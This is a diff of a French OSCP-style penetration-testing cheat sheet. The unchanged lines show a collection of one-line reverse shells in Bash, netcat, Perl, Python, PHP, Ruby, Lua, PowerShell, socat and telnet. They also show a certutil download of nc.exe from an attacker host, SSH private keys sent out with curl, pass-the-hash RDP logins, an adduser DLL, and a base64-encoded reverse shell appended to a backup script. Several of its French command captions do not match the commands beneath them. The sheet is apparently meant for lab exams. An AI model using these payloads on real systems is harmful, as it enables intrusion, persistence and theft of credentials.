@@ -7,9 +7,7 @@ description: "Commandes courantes et outils complémentaires."
 
 Commandes courantes et outils complémentaires.
 
-
 ### Bash
-
 
 <p class="oscp-command-note">Bash : établir une connexion de shell inversé vers l'adresse et le port du laboratoire.</p>
 
@@ -22,7 +20,6 @@ echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file
 
 ```
 
-
 <p class="oscp-command-note">Supprimer les fichiers indiqués.</p>
 
 ```bash
@@ -34,12 +31,9 @@ sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
 
 ```
 
-
 ### CMD
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\nc.exe</code></p>
-
 
 <p class="oscp-command-note">Examiner les paramètres des certificats Windows.</p>
 
@@ -55,9 +49,7 @@ certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe
 
 ```
 
-
 ### Golang
-
 
 <p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
@@ -66,11 +58,7 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 
 ```
 
-
 ### Java
-
-
-
 
 ```text
 r = Runtime.getRuntime()
@@ -79,22 +67,16 @@ p.waitFor()
 
 ```
 
-
 ### Lua
-
-
-
 
 ```bash
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<TARGET_PORT>);os.execute('/bin/sh -i <&3 >&3 2>&3');"
 
 ```
 
-
 ### Netcat
 
 Vérifier les ports et les services de la cible autorisée.
-
 
 <p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «Netcat».</p>
 
@@ -111,22 +93,16 @@ echo 'nc [lhost] [lport] -e /bin/bash' >> [file]
 
 ```
 
-
 ### Perl
-
-
-
 
 ```bash
 perl -e 'use Socket;$i="<TARGET_IP>";$p=<TARGET_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 ```
 
-
 ### PowerShell
 
 Observer les permissions et la configuration de Windows.
-
 
 <p class="oscp-command-note">PowerShell : charger ou exécuter l'outil concerné par «PowerShell».</p>
 
@@ -139,22 +115,16 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<TARGET_IP>', 
 
 ```
 
-
 ### PHP
 
 Examiner les entrées et les réponses de l'application web.
-
-
-
 
 ```bash
 php -r '$sock=fsockopen("<TARGET_IP>",<TARGET_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ```
 
-
 ### Python
-
 
 <p class="oscp-command-note">Exécuter -c avec les paramètres indiqués pour «Python».</p>
 
@@ -163,20 +133,14 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ```
 
-
 ### Ruby
-
-
-
 
 ```bash
 ruby -rsocket -e 'f=TCPSocket.open("<TARGET_IP>",<TARGET_PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 ```
 
-
 ### Socat
-
 
 <p class="oscp-command-note">Configurer une connexion ou une redirection réseau.</p>
 
@@ -185,9 +149,7 @@ socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash
 
 ```
 
-
 ### Telnet
-
 
 <p class="oscp-command-note">Supprimer les fichiers indiqués.</p>
 
@@ -196,9 +158,7 @@ rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin
 
 ```
 
-
 ### Outil pour générer un shell inversé (Reverse Shell)
-
 
 <p class="oscp-command-note">Examiner les fichiers et l&#x27;historique Git.</p>
 
@@ -211,9 +171,7 @@ shellrator
 
 ```
 
-
 ### Améliorer les shells interactifs
-
 
 <p class="oscp-command-note">Shell interactif : afficher la taille du terminal, suspendre puis reprendre correctement la session.</p>
 
@@ -232,8 +190,6 @@ export TERM=xterm  # Or use xterm-256color for extended color support
 stty rows <ROWS> columns <COLS>
 
 ```
-
-
 
 #### Netcat avec édition de ligne rlwrap
 
@@ -258,7 +214,6 @@ python3 penelope.py -p <PORT_ECOUTE>
 
 ### Bash
 
-
 <p class="oscp-command-note">Bash : ouvrir une nouvelle session interactive avec l'option -i.</p>
 
 ```bash
@@ -267,11 +222,7 @@ bash -i
 
 ```
 
-
 ### Lua
-
-
-
 
 ```text
 # Exécuter un nouveau shell Bash
@@ -279,11 +230,7 @@ os.execute('/bin/bash')
 
 ```
 
-
 ### Perl
-
-
-
 
 ```bash
 # Exécuter un nouveau shell Bash
@@ -291,9 +238,7 @@ perl -e 'exec "/bin/bash"'
 
 ```
 
-
 ### Python
-
 
 <p class="oscp-command-note">Créer un pseudo-terminal interactif avec Python.</p>
 
@@ -309,11 +254,7 @@ python -c 'import pty; import os; pty.spawn("/bin/bash"); os.system("stty raw -e
 
 ```
 
-
 ### Ruby
-
-
-
 
 ```ruby
 # Exécuter un nouveau shell Bash
@@ -321,11 +262,7 @@ exec "/bin/bash"
 
 ```
 
-
 ### Sh
-
-
-
 
 ```text
 # Ouvrir un nouveau shell interactif
@@ -333,19 +270,15 @@ sh -i
 
 ```
 
-
 ### Linux
 
 Examiner les permissions et la configuration de Linux.
-
 
 #### Outils BloodHound
 
 Examiner les objets, les droits et les services du domaine.
 
-
 #### Utilitaires complémentaires : consulter les commandes ci-dessous
-
 
 <p class="oscp-command-note">Gérer les paquets Debian/Ubuntu.</p>
 
@@ -354,17 +287,14 @@ sudo apt install krb5-user
 
 ```
 
-
 ```bash
 sudo apt update && sudo apt upgrade && sudo apt install putty-tools
 
 ```
 
-
 ### Windows
 
 Observer les permissions et la configuration de Windows.
-
 
 #### Outils BloodHound
 
@@ -375,8 +305,6 @@ Pour l’installation et la collecte BloodHound, consulter la rubrique [Énumér
 #### Outils Kerberos
 
 Examiner les objets, les droits et les services du domaine.
-
-
 
 #### Informations sur le système Windows
 
@@ -392,7 +320,6 @@ Get-ComputerInfo | Select-Object CsName,WindowsProductName,WindowsVersion,OsBuil
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
-
 <p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>
 
 ```bash
@@ -400,11 +327,9 @@ xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboa
 
 ```
 
-
 ### Connexion RDP avec un hash NTLM (Pass-the-Hash)
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
-
 
 <p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>
 
@@ -414,11 +339,9 @@ xfreerdp /size:1920x1080 /v:[IP] /u:[user] /H:[hash] /cert:ignore /dynamic-resol
 
 ```
 
-
 ### Connexion RDP avec rdesktop
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
-
 
 <p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>
 
@@ -428,9 +351,7 @@ rdesktop [IP]
 
 ```
 
-
 ### Connexion RDP avec paramètres personnalisés
-
 
 <p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>
 
@@ -440,18 +361,13 @@ xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/ho
 
 ```
 
-
-
-
 ```bash
 # Connectez-vous aux dimensions et aux références spécifiées
 rdesktop [IP] -u [user] -p [password] -g 80%+150+100
 
 ```
 
-
 ### Activer RDP lorsqu’il est désactivé
-
 
 <p class="oscp-command-note">Vérifier la configuration RDP et l’authentification NLA avec PowerShell.</p>
 
@@ -468,24 +384,15 @@ $ComputerName = hostname
 
 ```
 
-
-
-
 ```powershell
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 
 ```
 
-
-
-
 ```powershell
 Add-LocalGroupMember -Group "Remote Desktop Users" -Member "[username]"
 
 ```
-
-
-
 
 ```powershell
 # Option 1 : utiliser un compte Active Directory
@@ -495,9 +402,6 @@ Add-ADGroupMember -Identity "Remote Desktop Users" -Members "[domain]\[username]
 net localgroup "Remote Desktop Users" "[domain]\[username]" /add
 
 ```
-
-
-
 
 ```powershell
 # Ceci est fait parce que si un pare-feu est configuré, il peut causer des problèmes pour notre RDP
@@ -509,9 +413,6 @@ Get-NetFirewallRule -DisplayGroup "Remote Desktop"
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
 ```
-
-
-
 
 ```powershell
 # 1. Créer le nouvel utilisateur
@@ -535,9 +436,7 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 
 ```
 
-
 ## Techniques de décodage et d’encodage
-
 
 <p class="oscp-command-note">Afficher les valeurs ou chaînes utilisées dans «Techniques de décodage et d’encodage».</p>
 
@@ -550,7 +449,6 @@ echo -n "Hello" | od -An -t uC | tr -d ' \n'
 
 ```
 
-
 ```bash
 # Décoder
 echo "SGVsbG8gd29ybGQ=" | base64 -d
@@ -559,7 +457,6 @@ echo "SGVsbG8gd29ybGQ=" | base64 -d
 echo "Hello world" | base64
 
 ```
-
 
 ```bash
 # Décoder
@@ -570,7 +467,6 @@ echo "Hello world" | xxd -p
 
 ```
 
-
 ```bash
 # Décoder
 echo "dlrow olleH" | rev
@@ -579,7 +475,6 @@ echo "dlrow olleH" | rev
 echo "Hello world" | rev
 
 ```
-
 
 ```bash
 # Décoder
@@ -590,7 +485,6 @@ echo "Hello world" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 
 ```
 
-
 ```bash
 # Décoder
 echo "Hello%20World%21" | python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read().strip()))"
@@ -600,9 +494,7 @@ echo "Hello World!" | python3 -c "import urllib.parse, sys; print(urllib.parse.q
 
 ```
 
-
 ### Requêtes HTTP de base
-
 
 <p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Requêtes HTTP de base».</p>
 
@@ -611,16 +503,13 @@ curl http://example.com
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl -H "Accept: application/json" http://example.com
 
 ```
 
-
 ### Présentation des données
-
 
 <p class="oscp-command-note">Envoyer une requête HTTP POST.</p>
 
@@ -629,13 +518,11 @@ curl -X POST -d "param1=value1&param2=value2" http://example.com/submit
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl -H "Content-Type: application/json" -X POST -d '{"key1":"value1", "key2":"value2"}' http://example.com/api
 
 ```
-
 
 ```bash
 # Récupérer une ressource HTTP
@@ -643,13 +530,11 @@ curl -X POST -d "param1=value1&param2=value2" --data-urlencode http://example.co
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl -X PUT -d "param1=value1&param2=value2" http://example.com/update
 
 ```
-
 
 ```bash
 # Récupérer une ressource HTTP
@@ -657,9 +542,7 @@ curl -X DELETE http://example.com/delete
 
 ```
 
-
 ### Authentification et en-têtes HTTP
-
 
 <p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Authentification et en-têtes HTTP».</p>
 
@@ -668,16 +551,13 @@ curl -u username:password http://example.com
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl -A "CustomUserAgent/1.0" http://example.com
 
 ```
 
-
 ### Gestion des réponses HTTP
-
 
 <p class="oscp-command-note">HTTP : examiner les en-têtes et le statut de la réponse.</p>
 
@@ -686,13 +566,11 @@ curl -i http://example.com
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl -o filename.html http://example.com
 
 ```
-
 
 ```bash
 # Récupérer une ressource HTTP
@@ -700,13 +578,11 @@ curl -I http://example.com
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl -s http://example.com
 
 ```
-
 
 ```bash
 # Récupérer une ressource HTTP
@@ -714,9 +590,7 @@ curl -v http://example.com
 
 ```
 
-
 ### Cookies et gestion des sessions
-
 
 <p class="oscp-command-note">HTTP : transmettre les cookies avec la requête.</p>
 
@@ -725,13 +599,11 @@ curl -b "cookie1=value1; cookie2=value2" http://example.com
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl -c cookies.txt http://example.com
 
 ```
-
 
 ```bash
 # Récupérer une ressource HTTP
@@ -739,9 +611,7 @@ curl -b cookies.txt http://example.com
 
 ```
 
-
 ### Opérations de fichiers
-
 
 <p class="oscp-command-note">HTTP : envoyer un fichier par POST multipart avec curl -F (serveur de réception requis).</p>
 
@@ -750,18 +620,15 @@ curl -F "file=@path/to/file" http://example.com/upload
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl -C - -o filename http://example.com/file
 
 ```
 
-
 ### Proxy et options de sécurité
 
 Configurer et comprendre les chemins de communication réseau.
-
 
 <p class="oscp-command-note">HTTP : acheminer la requête par un proxy.</p>
 
@@ -770,16 +637,13 @@ curl -x http://proxyserver:port http://example.com
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl -k https://example.com
 
 ```
 
-
 ### Options complémentaires
-
 
 <p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Options complémentaires».</p>
 
@@ -788,13 +652,11 @@ curl -L http://example.com
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl --max-time 30 http://example.com
 
 ```
-
 
 ```bash
 # Récupérer une ressource HTTP
@@ -802,14 +664,11 @@ curl -s -o /dev/null -w "%{http_code}" http://example.com
 
 ```
 
-
 ```bash
 # Récupérer une ressource HTTP
 curl --http2 http://example.com
 
 ```
-
-
 
 ### Détecter le type d'un fichier
 
@@ -845,14 +704,10 @@ jq '.data' < <REPONSE>.json
 
 ## Générer une clé SSH
 
-
-
-
 ```bash
 ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N ''
 
 ```
-
 
 <p class="oscp-command-note">Démarrer un serveur HTTP local pour fournir des fichiers.</p>
 
@@ -869,7 +724,6 @@ curl -T /tmp/id_rsa http://<IP_RECEPTEUR>:8080/id_rsa
 
 ```
 
-
 <p class="oscp-command-note">Supprimer les fichiers indiqués.</p>
 
 ```bash
@@ -877,7 +731,6 @@ curl -T /tmp/id_rsa http://<IP_RECEPTEUR>:8080/id_rsa
 rm /tmp/id_rsa /tmp/id_rsa.pub
 
 ```
-
 
 <p class="oscp-command-note">Télécharger une ressource distante.</p>
 
@@ -887,7 +740,6 @@ wget http://<victim_ip>/id_rsa
 
 ```
 
-
 <p class="oscp-command-note">Modifier les permissions d&#x27;un fichier.</p>
 
 ```bash
@@ -895,15 +747,12 @@ chmod 600 id_rsa
 
 ```
 
-
 <p class="oscp-command-note">Se connecter avec une clé SSH privée.</p>
 
 ```bash
 ssh -i id_rsa user@<victim_ip>
 
 ```
-
-
 
 ### Créer une clé Ed25519
 
@@ -919,9 +768,6 @@ ssh-keygen -t ed25519 -f <CHEMIN_CLE> -C 'audit-laboratoire'
 
 Observer les permissions et la configuration de Windows.
 
-
-
-
 <p class="oscp-command-note">Extrait C : exemple technique pour «Compilation croisée pour Windows» (ce n'est pas une commande de terminal).</p>
 
 ```c
@@ -935,9 +781,6 @@ int main ()
 }
 
 ```
-
-
-
 
 <p class="oscp-command-note">Extrait C : exemple technique pour «Compilation croisée pour Windows» (ce n'est pas une commande de terminal).</p>
 
@@ -964,7 +807,6 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
 
 ```
 
-
 <p class="oscp-command-note">Commandes de compilation croisée vers Windows.</p>
 
 ```bash
@@ -976,9 +818,7 @@ x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows
 
 ```
 
-
 ## Retrouver les fichiers de preuve (Flags)
-
 
 <p class="oscp-command-note">Rechercher des fichiers correspondant au motif «local.txt».</p>
 
@@ -986,7 +826,6 @@ x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows
 find / -type f -name local.txt 2>/dev/null
 
 ```
-
 
 <p class="oscp-command-note">Afficher le nom de la machine.</p>
 
@@ -999,9 +838,7 @@ hostname && whoami && type [local/proof].txt && ipconfig /all
 
 ```
 
-
 ## Conseils complémentaires
-
 
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Conseils complémentaires».</p>
 
@@ -1019,15 +856,11 @@ ls -l id_rsa
 
 ```
 
-
-
-
 ```bash
 # Ajouter un utilisateur à un groupe
 sudo usermod -aG <group_name> <username>
 
 ```
-
 
 <p class="oscp-command-note">Afficher les métadonnées d&#x27;un fichier.</p>
 
@@ -1036,18 +869,13 @@ exiftool -a -u [file.extension]
 
 ```
 
-
-
-
 ```bash
 hashid [hash]
 
 ```
 
-
 **Paramètres et repères :**
 `xato-net-10-million-usernames.txt` · `/etc/sudoers`  
-
 
 <p class="oscp-command-note">Se placer dans le répertoire utilisé pour «Conseils complémentaires».</p>
 
@@ -1066,7 +894,6 @@ sudo /bin/bash
 
 ```
 
-
 <p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
 ```bash
@@ -1074,14 +901,12 @@ echo "-----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY-----"
 
 ```
 
-
 <p class="oscp-command-note">Rechercher des fichiers correspondant au motif «*.php».</p>
 
 ```bash
 find [directoryPath] -maxdepth 5 -name "*.php" -exec grep -Hni "password" {} \; 2>/dev/null
 
 ```
-
 
 <p class="oscp-command-note">Encoder ou décoder les données au format Base64.</p>
 
@@ -1101,7 +926,6 @@ echo -n "sh -i >& /dev/tcp/$KaliIP/80 0>&1" | base64
 echo "echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzYvODAgMD4mMQ=='|base64 -d|bash" >> /var/backups/etc_Backup.sh
 
 ```
-
 
 <p class="oscp-command-note">Script PowerShell pour les conseils complémentaires.</p>
 
@@ -1150,7 +974,6 @@ dir /b/s "<FILE>"
 
 ```
 
-
 <p class="oscp-command-note">Linux : créer un groupe et un utilisateur avec les UID/GID fournis (droits sudo requis).</p>
 
 ```bash
@@ -1165,9 +988,6 @@ sudo passwd <username>
 
 ```
 
-
-
-
 ```bash
 # Linux
 export PATH="$PATH:/usr/local/bin:/usr/bin:/bin"
@@ -1176,8 +996,6 @@ export PATH="$PATH:/usr/local/bin:/usr/bin:/bin"
 set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
 
 ```
-
-
 
 ### Vérifier une empreinte de fichier
 
@@ -1262,7 +1080,6 @@ xfreerdp3 /v:<IP_CIBLE> /u:<UTILISATEUR> /dynamic-resolution
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
 
 <!-- refined-oscp -->
-
 
 ### UPX : examiner un exécutable compacté
 
